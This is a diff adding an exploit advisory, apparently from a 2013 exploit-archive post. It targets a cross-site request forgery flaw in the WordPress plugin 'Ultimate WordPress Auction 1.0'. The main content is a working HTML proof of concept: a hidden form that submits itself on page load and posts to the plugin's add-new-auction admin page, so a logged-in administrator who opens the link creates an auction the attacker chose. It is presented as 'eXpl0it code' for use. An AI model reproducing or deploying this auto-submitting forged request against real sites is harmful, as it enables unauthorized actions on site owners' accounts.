@@ -1,0 +1,86 @@
+=============================================================
+        __   __          _    ___    _   __   ____         
+        \ \ / /         | |  / _ \  (_) /_ | |___ \        
+   ___   \ V /   _ __   | | | | | |  _   | |   __) |  _ __ 
+  / _ \   > <   | '_ \  | | | | | | | |  | |  |__ <  | '__|
+ |  __/  / . \  | |_) | | | | |_| | | |  | |  ___) | | |   
+  \___| /_/ \_\ | .__/  |_|  \___/  |_|  |_| |____/  |_|   
+                | |                                        
+                |_|              blackpentesters.blogspot.com
+=============================================================
+
+##############################################################################
+# Exploit Title: [ Ultimate WordPress Auction v1.0 Plugin CSRF Vulnerability ]
+# Date: [2013-6-15]							             	  
+# Exploit Author: [expl0i13r]						     	     	  
+# Vendor Homepage: [http://wordpress.org/plugins/ultimate-auction/] 				  
+# Software Link: [http://downloads.wordpress.org/plugin/ultimate-auction.zip]         	  
+# Version: [1.0]			                                             	  		
+# Tested on: [Wordpress 3.5.1 (Windows)]						  
+# Contact: expl0i13r@gmail.com						             	  
+##############################################################################
+
+
+1. Plugin Description:
+========================
+
+The Ultimate WordPress Auction plugin allows easy and quick way to set up a professional auction website in ebay style.
+
+2. Vulnerability Description:
+==============================
+
+This wordpress plugin "Ultimate WordPress Auction 1.0" suffers from CSRF vulnerability which can be successfully exploited by attacker to add Fake Auction Bids.
+
+
+Affected URL:
+--------------
+
+http://127.0.0.1/wordpress-3.5.1/wordpress/wp-admin/admin.php?page=add-new-auction
+
+
+eXpl0it code:
+--------------
+
+<html>
+<head>
+<script type="text/javascript" language="javascript">
+function submitform()
+{
+ 	document.getElementById('myForm').submit();
+}
+</script>
+</head>
+<body>
+
+<form name="myForm" id="wdm-add-auction-form" class="auction_settings_section_style" action="http://127.0.0.1/wordpress-3.5.1/wordpress/wp-admin/admin.php?page=add-new-auction" method="POST" novalidate="novalidate">
+
+Link: http://blackpentesters.blogspot.in/
+Title: 
+<input name="auction_title" type="text" id="auction_title" class="regular-text valid" value="expl0iter">
+Description:      
+<textarea name="auction_description" type="text" id="auction_description" cols="50" rows="10" class="large-text code valid">&lt;/textarea&gt;
+<input name="opening_bid" type="text" id="opening_bid" class="small-text number" min="0" value="">
+<input name="lowest_bid" type="text" id="lowest_bid" class="small-text number" min="0" value="">
+<input name="incremental_value" type="text" id="incremental_value" class="small-text number" min="0" value="">
+<input name="end_date" type="text" id="end_date" class="regular-text hasDatepicker" readonly="" value="2013-07-10 00:00:00">
+<input name="buy_it_now_price" type="text" id="buy_it_now_price" class="small-text number" min="1" value="">
+<input type="submit" name="submit" id="submit" class="button button-primary" value="Save Changes">
+
+</form>
+
+<script type="text/javascript" language="javascript">
+document.myForm.submit()
+</script>
+</body>
+</html>
+
+Once victim clicks on this link new auction of attackers choice will be added.(provided victim logged in to wordpress)
+
+
+##################################
+#           eXpl0i13r            #
+# ------------------------------ #
+#|blackpentesters.blogspot.com	|#
+#|infotech-knowledge.blogspot.in|#
+# ------------------------------ #
+##################################
